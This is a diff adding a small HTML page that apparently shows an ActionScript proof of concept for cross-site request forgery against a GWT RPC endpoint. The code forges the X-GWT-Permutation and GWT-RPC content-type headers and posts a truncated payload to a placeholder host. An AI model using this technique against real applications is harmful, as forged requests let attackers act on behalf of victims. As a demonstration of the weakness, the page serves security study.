@@ -1,0 +1,22 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Actionscript GWT CSRF Example</title>
+</head><body>public function CSRF(){<br/>
+&#09;var myRequest:URLRequest = new URLRequest(<br/>
+&#09;&#09;&#09;"http://website.com/app" );<br/>
+&#09;&#09;var myLoader:URLLoader = new URLLoader();<br/>
+&#09;&#09;var contentHeader: URLRequestHeader = new URLRequestHeader("Content-type", "text/x-gwt-rpc; charset=utf-8" );<br/>
+&#09;&#09;var permutationHeader: URLRequestHeader = new <br/>
+<br/>
+&#09;<span style="color: #ff0000">URLRequestHeader</span>( "X-GWT-Permutation","AODASID88FD7DFA97dFDF98DF87");<br/>
+&#09;&#09;<br/>
+&#09;myRequest.method = URLRequestMethod.POST;<br/>
+&#09;myRequest.requestHeaders.push(contentHeader);<br/>
+&#09;myRequest.requestHeaders.push( permutationHeader );<br/>
+&#09;&#09;&#09;<br/>
+&#09;var <span style="color: #ff0000">payload</span>:String = new String( "5|0|1|blah[..snip..]" );<br/>
+&#09;myRequest.data = payload;<br/>
+&#09;myLoader.load( myRequest );<br/>
+</body></html>
